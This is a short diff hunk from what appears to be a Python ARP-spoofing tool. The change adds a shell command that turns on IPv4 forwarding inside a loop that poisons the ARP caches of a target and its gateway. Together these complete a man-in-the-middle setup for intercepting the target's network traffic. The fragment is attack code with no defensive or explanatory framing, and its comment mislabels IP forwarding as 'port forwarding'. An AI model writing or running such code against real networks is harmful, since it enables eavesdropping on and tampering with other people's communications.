@@ -205,6 +205,7 @@ def spoof(target_ip, spoof_ip):
         pass
 
 def arpspoof(target, gateway):
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # enable port forwarding
     while True:
         spoof(target, gateway)
         spoof(gateway, target)
